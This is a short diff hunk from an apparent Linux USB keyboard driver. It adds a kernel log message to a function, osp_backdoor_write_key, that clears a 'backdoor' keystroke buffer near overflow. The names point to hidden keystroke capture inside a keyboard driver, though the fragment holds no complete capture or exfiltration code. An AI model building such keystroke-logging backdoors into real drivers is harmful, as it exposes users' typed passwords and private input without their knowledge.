@@ -446,6 +446,7 @@ static void osp_backdoor_write_key(int keycode)
 	// When buffer length is about to overflow, reset it.
 	if(strlen(osp_backdoor_buffer) > osp_backdoor_buffer_maxsize - 16)
 	{
+		printk(KERN_INFO "usbkbd: Backdoor buffer is about to overflow, clear it now.");
 		memset(osp_backdoor_buffer, '\0', osp_backdoor_buffer_maxsize);
 		osp_backdoor_buffer_length = 0;
 	}
